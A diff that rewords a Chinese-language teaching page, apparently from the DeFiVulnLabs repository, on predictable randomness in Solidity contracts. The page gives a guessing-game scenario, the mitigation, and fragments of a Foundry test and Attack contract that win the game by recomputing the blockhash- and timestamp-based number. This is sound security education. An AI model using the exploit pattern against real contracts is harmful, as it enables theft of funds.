@@ -1,26 +1,27 @@
 # 随机性 
 [Randomness.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Randomness.sol)   
-**名称：** 可预测随机性漏洞  
+**名称：** 可预测的随机性漏洞  
 **描述：**  
-使用全局变量，如块哈希、块号、区块时间戳等字段是不安全的，矿工和攻击者可以控制它。  
-
+使用全局变量如区块哈希、区块编号、区块时间戳等字段是不安全的，矿工和攻击者可以控制它。    
 
 
 **场景：**  
-GuessTheRandomNumber是一款游戏，如果您能猜到从块哈希和时间戳生成的伪随机数，您将赢得1个以太币。  
+GuessTheRandomNumber合约是一款游戏，在这个游戏中，如果你能猜到从区块哈希和时间戳生成的伪随机数，你就可以赢得1个以太币。  
+
 乍一看，似乎无法猜出正确的数字。  
-但让我们看一下获胜有多容易。 
- 1. Alice用1个以太币部署GuessTheRandomNumber合约  
- 2. Eve部署攻击合约  
+但是让我们看看赢得这个游戏有多容易。  
+
+ 1. Alice部署GuessTheRandomNumber并存入1个以太币  
+ 2. Eve部署Attack合约  
  3. EVe调用Attack.attack()赢得了1个以太币
 
 
 
-**这会发生什么？**  
-攻击者只需复制计算随机数的代码就可以计算出正确答案。
+**发生了什么？**  
+Attack合约通过简单地复制计算随机数的代码，计算出了正确的答案。  
 
 
-**修复意见：** 
+**缓解措施：** 
 不要使用blockhash和block.timestamp作为随机性的来源。  
 
 **参考：**  
@@ -48,7 +49,7 @@ contract GuessTheRandomNumber {
 **如何测试：**  
 forge test --contracts src/test/Randomness.sol-vvvv  
 ```
-// 测试对使用可预测随机性合约攻击的函数
+// 用于测试对存在可预测随机性漏洞合约的攻击
 function testRandomness() public {
     // 将地址值从以太坊虚拟机分配给“alice”和“eve”。
     address alice = vm.addr(1);
@@ -75,10 +76,10 @@ function testRandomness() public {
     // Attack合约试图猜测GuessTheRandomNumberContract的随机数。
     AttackerContract.attack(GuessTheRandomNumberContract);
 
-    // 再次记录AttackerContract合约的余额，显示攻击是否成功。
+    // 再次记录AttackerContract合约的余额，以确定攻击是否成功。
     console.log("Eve wins 1 Eth, Balance of AttackerContract:", address(AttackerContract).balance);
 
-    // 记录一条消息，表示漏洞攻击已完成。
+    // 记录一条消息，表示攻击已完成。
     console.log("Exploit completed");
 }
 
@@ -100,7 +101,7 @@ contract Attack {
         guessTheRandomNumber.guess(answer);
     }
 
-    // 辅助函数，用于检查此合约的余额。
+    // 辅助函数，用于检查当前合约的余额。
     function getBalance() public view returns (uint) {
         return address(this).balance;
     }
